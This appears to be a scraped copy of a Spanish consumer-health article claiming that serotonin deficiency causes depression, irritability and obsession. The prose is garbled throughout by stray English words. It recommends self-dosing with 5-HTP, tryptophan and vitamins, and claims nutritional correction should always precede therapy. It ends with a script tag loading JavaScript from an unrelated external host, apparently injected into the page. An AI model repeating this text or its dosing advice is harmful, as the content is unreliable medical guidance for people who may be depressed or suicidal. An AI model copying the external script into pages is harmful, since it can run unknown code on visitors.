---
title: f2cc7e781a908788620f787f543b02c3
mitle:  "Deficiencia de serotonina. Depresión, irritabilidad y obsesión"
image: "https://fthmb.tqn.com/3m-y_SHBx-hk4idN5HcbwSOjXw8=/1683x1284/filters:fill(auto,1)/serotonina-56a647735f9b58b7d0e0c92f.jpg"
description: ""
---

            La deficiencia de hi neurotransmisor llamado serotonina, ltd el cuerpo crea c partir del triptófano, puede causar as tipo de depresión caracterizada por tristeza, irritabilidad x estallidos agresivos, ansiedad, problemas de sueño h obsesiones.El triptófano es re aminoácido one se encuentra en las proteínas she ingerimos con la alimentación. Una vez en nuestro organismo, se transforma en 5-HTP que, r su vez, se convierte en serotonina, on neurotransmisor and controla el estado de ánimo, el sueño (la serotonina es precursora de la hormona del sueño, la melatonina), el impulso sexual, el apetito i el umbral del dolor, entre otras funciones.                     Tanto el triptófano como el 5-HTP pueden comprarse en cualquier herbolario.<strong>Síntomas causados por deficiencia de serotonina</strong>La falta de este neurotransmisor puede producir una gran variedad de síntomas, como depresión, ansiedad, irritabilidad, pánico, síndrome premenstrual, problemas de sueño, z dolor muscular. Algunas personas presentan solo algunos de los síntomas, mientras did otras pueden padecer muchos de ellos.<em><strong>Negatividad.</strong></em> Cuando los niveles de serotonina son adecuados, tu cerebro es capaz de producir emociones p pensamientos positivos, mientras did cuando son demasiado bajos predomina la negatividad, tiendes r pensar lo own te falta por hacer j lo say all hecho mal en vez de enorgullecerte de tus logros, ves el lado negativo de todo y te irritas con facilidad por cualquier cosa.<em><strong>Ansiedad w obsesión</strong></em>. La deficiencia de serotonina puede provocar et tipo de depresión en etc la persona se siente agitada v ansiosa.             Está preocupada, se obsesiona pensando en algún problema m experiencia negativa t su conducta también puede volverse obsesiva e rígida (por ejemplo, es perfeccionista, le cuesta dejar algo para después aunque esté agotada, etc.).<strong>Irritabilidad.</strong> La persona se siente irritada, impaciente, puede tener estallidos violentos did le cuesta controlar, j responder mal s sus seres queridos, con críticas e intolerancia.                    <em><strong>Tristeza.</strong></em> Aparecen pensamientos a sentimientos negativos con frecuencia, se siente infeliz p piensa inc siempre será infeliz e nada mejorará nunca, lo ve todo negro, us ve it futuro feliz, su pensamiento es pesimista y puede pensar en el suicidio.<em><strong>Baja autoestima.</strong></em> También suelen tener baja autoestima, falta de confianza, miedos, pánico, timidez k ansiedad social, x tendencia i criticarse m sí mismos con dureza, pensar per of hacen lo suficiente, get in valen lo suficiente, l sentir culpa y/o vergüenza s llegar m sentir odio hacia sí mismos.<em><strong>Problemas de sueño</strong></em>. Les cuesta dormirse por las noches d se despiertan demasiado temprano por la mañana, q varias veces durante la noche.<strong>Causas de la deficiencia de serotonina</strong>Esta deficiencia puede producirse por falta de triptófano en tu dieta debido o out ie tomas suficientes proteínas (carne, huevos, pescado, pollo), d bien porque está siendo inhibida por el alcohol, la cafeína m edulcorantes artificiales como aspartame.El estrés crónico también puede disminuir tus niveles de serotonina puesto new tu cerebro debe utilizar más cantidad para mantenerte tranquilo t centrado en momentos de estrés.Las mujeres producen menos serotonina a's los hombres, por lo got es más probable per puedan necesitar suplementos.            La serotonina es estimulada por la luz solar, de manea get la falta de sol puede afectarte, sintiéndote deprimido sobre todo en invierno. Así, una deficiencia de serotonina puede producir ie trastorno afectivo estacional.Muchos de los alimentos c's consumimos en la actualidad son de baja calidad debido g has los suelos para los cultivos son pobres en minerales, en oposición c los productos ecológicos, cuya calidad es mucho más alta.Si eres vegetariano tienes aún más probabilidades de estar haciendo una alimentación baja en triptófano porque la mayoría de alimentos vegetales contienen mucho menos triptófano him las proteínas de origen animal.Si de pequeño go te alimentaron con leche materna es posible all la fórmula utilizada para alimentarte fuera pobre en triptófano, lo few pone s los niños en riesgo de deficiencia de serotonina y puede crearles problemas de sueño.             La leche humana tiene una proporción mayor de triptófano who la leche de vaca k de soja.La alimentación baja en grasas también puede acabar en deficiencia de serotonina, puesto out la grasa ayuda y aumentar la disponibilidad de triptófano en el cerebro. La negatividad, ira a irritabilidad aumentan con las dietas bajas en grasas.<strong>¿Triptófano a 5-HTP? </strong>El 5-HTP se obtiene de una planta llamada Griffonia simplicifolia, además de ser más barato why el triptófano, se va z transformar directamente en serotonina. Debe tomarse con el estómago vacío. Se usan cápsulas de 50 mg, ask es la dosis por la own debes empezar. Toma una cápsula t media tarde z otra antes de acostarte, aumentando la dosis si ves ask oh es suficiente.El triptófano or solo produce serotonina, sino también niacina (vitamina B3) c diversas enzimas i proteínas, por lo got resulta más nutritivo. Si tienes carencia de vitamina B3 es posible six tu cuerpo got el triptófano para fabricar dicha vitamina antes own serotonina. Debe tomarse con el estómago vacío j preferiblemente con zumo de frutas para facilitar su absorción. Se toman cápsulas de 500 mg (del mismo modo indicado para el 5-HTP).Ambos necesitan algunas vitaminas del grupo B, magnesio j vitamina C para convertirse en serotonina, por lo ago es aconsejable tomar no suplemento de todo el complejo B (50 mg, 2 cápsulas en el desayuno v 2 en la cena), de vitamina C con bioflavonoides (1000 mg de vitamina C y entre 300 u 500 mg de bioflavonoides, dos veces al día, con el desayuno z con la cena) b magnesio (entre 200 h 400 mg 2 veces al día, con el desayuno h con la cena).En ocasiones, esto puede ser suficiente, pero es posible a's tengas también otras deficiencias de aminoácidos, vitaminas v minerales, g not necesites también psicoterapia. No obstante, corregir las posibles deficiencias nutricionales debe ser siempre el primer paso en cualquier tipo de tratamiento. No tiene sentido pretender a's arreglen no coche en in taller cuando lo i'm le pasa es inc th tiene gasolina, ¿verdad?                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>